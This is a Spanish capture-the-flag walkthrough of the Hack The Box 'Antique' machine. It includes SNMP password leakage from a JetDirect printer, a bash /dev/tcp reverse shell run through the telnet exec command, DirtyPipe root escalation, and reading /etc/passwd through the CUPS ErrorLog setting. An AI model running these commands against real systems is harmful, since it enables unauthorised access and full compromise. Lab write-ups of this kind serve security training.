# Antique
<table>
  <tr>
    <td style="vertical-align: top; padding-right: 20px;">
      <img src="portadas/antique.png" alt="antique" style="max-width:320px; width:100%; height:auto;"/>
    </td>
    <td style="vertical-align: top; padding-left: 20px;">
      <strong>Vulnerabilidades / Características a tratar</strong>
      <ul>
        <li>SNMP Enumeration</li>
        <li>Network Printer Abuse</li>
        <li>Local Pivoting / Proxy Setup</li>
        <li>CUPS Administration exploitation</li>
      </ul>
    </td>
  </tr>
</table>

## Reconocimiento inicial
Realizamos un escaneo de todos los puertos para comprobar cuáles estan abiertos y lo exportamos al fichero `allports` 

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107 -oG allports
```

```shell
PORT      STATE    SERVICE REASON
23/tcp    open     telnet  syn-ack ttl 63
```

Vamos a realizar un escaneo más exaustivo del puerto encontrado


```shell
nmap -sCV -p23 10.10.11.107 -oN targeted
```
Obtnemos lo siguiente:

```shell
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
```

Como solo hemos encontrado un puerto vamos a enumerar tambien los puertos de UDP por si alguno esta abierto.

```shell
nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.107
```

Como se puede ver encontramos el puerto 161 abierto con el servicio snmp corriendo.

```shell
PORT    STATE SERVICE
161/udp open  snmp
```

## Enumeramos snmp 

Como vemos que snmp se encuentra disponible vamos a enumerarlo con la herramienta `snmpwalk` 

vemos que si enuumeramos el string no obtenemos mucha información 

```shell
snmpwalk -v1 -c public 10.10.11.107
```

obtenemos lo siguiente 

```shell
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
```
si buscamos en en `searchexploit` algun resultado tneemos uno interesante con el siguiente contenido 
```shell
searchsploit HP JetDirect
HP JetDirect Printer - SNMP JetAdmin Device Password 
```
Nos comparte el siguiente exploit que podemos adaptar a nuestro caso:

```java
HP JetDirect J2552A/J2552B/J2591A/J3110A/J3111A/J3113A/J3263A/300.0 X Printer SNMP JetAdmin Device Password Disclosure Vulnerability

source: https://www.securityfocus.com/bid/7001/info

A problem with JetDirect printers could make it possible for a remote user to gain administrative access to the printer.

It has been reported that HP JetDirect printers leak the web JetAdmin device password under some circumstances. By sending an SNMP GET request to a vulnerable printer, the printer will return the hex-encoded device password to the requester. This could allow a remote user to access and change configuration of the printer.

C:\>snmputil get example.printer public .1.3.6.1.4.1.11.2.3.9.1.1.13.0 
```

Voy a intentar enumerarlo como pone pero con nuestra herramienta de enumeracion:

```shell
snmpget -v1 -c public 10.10.11.107 1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

BINGO!! obtenemos una cadena en hexadecimal bastante sospechosa:

```shell
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

si lo decodificamos obtenmos una contraseña `P@ssw0rd@123!!123`

```shell
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | tr -d ' ' | xxd -r -p
P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i   IY�aA�"1&1A5
```

## Accedemos al servicio telnet
Es momento de intentar acceder al servicio `Telnet` y comprobar que nos encontramos, al parecer esta el campo para poner la contraseña que hemos encontrado y conseguir acceder.

```shell
telnet 10.10.11.107 
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123
```
Al entrar nos encontramos un con que si ponemos una `?` podemos obtener más datos de quienes somos parece que alfinal hay una opcion con exec para ejecutar comandos del sistema
```shell
Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
> 

```
## Intrusión en el sistema
Tras probar varios comandos que funcionan de manerca correcta voy a intentar entablarme una revershell para ello ejecutamos el siguiente comando.

```shell
> exec bash -c "bash -i >& /dev/tcp/MiIP/492 0>&1"
```
Estando en escucha por el otro puerto con `nc`

```shell
nc -lvnp 492
```
vemos que nos entabla una shell por lo tanto vamos a realizar un pequeño tratamiento para que tengamos una shell más cómoda.

## Tratamiento de la TTY
Importamos la shell desde python3

```shell
python3 -c  'import pty;pty.spawn("/bin/bash")'
Ctrl Z
```
La ponemos en segundo plano y la recargamos
```shell
ssty raw -echo: fg
```
Por último ponemos el siguiente comando:
```shell
reset xterm
```
Una vez dentro de la máquina otra vez exportamos las variable de entorno para tener una bash 
```shell
export SHELL=bash
export TERM=xterm
```
De esta manera podemos ver la primera flag `user.txt`

## Escalada de privilegios

Se puede realizar de varias maneras yo voy a usar `dirtyPipe` puedes acceder al recurso en el siguiente enlace:

```
https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
```
Esta vulnerabilidad se puede acontecer cuando podemos compilar con gcc , es capaz de inyectar y modificar el fichero `/etc/passwd` y crea un usuario o modificar root. Simplemente tenemos que copiar el exploit  en un directorio temporal compilarlo y ejecutarlo.
```shell
gcc privesc.c -o exploit
```
```shell
./exploit
```
Por último tenemos acceso completo a la máquina 
```shell
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "aaron"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)
whoami
root
```
## Forma alternativa
Comprobamos si encontramos algún puerto abierto intersante en la mauina que no encontrarmos anteriormente

```shell
netstat -ant
```
Al parcer encontramos un puerto escuchando muy interesante  `127.0.0.1:631`

Voy a instalar chisel para poder hacer portforwarding a mi máquina para ello nos clonamos el repositorio.

```shell
git clone https://github.com/jpillora/chisel
cd chisel && go build -ldflags="-s -w"
sudo ./chisel server -p 8000 --reverse
``` 

Nos pasamos el fichero y nos ponemos como cliente en la máuna victima haciendo el portforwarding

```shell
./chisel client 10.10.14.107:8000 R:631:127.0.0.1:631
```

De esta manera obtenemos una página web que muestra una pagina de administración de CUPS.

Si hacemos click en `View Error log`muestra el contenido de error.log.
Como CUPS esta funcionado como root por defecto podemos leer archivo utilizando èrrorLog`de esta manera podemos usar el siguiente comando.

```shell
cupsctl ErrorLog="/etc/passwd"
```

Posteriormente haciendo una petición `curl http://localhost:631/admin/log/error_log?` nos muestra el contendio del fichero.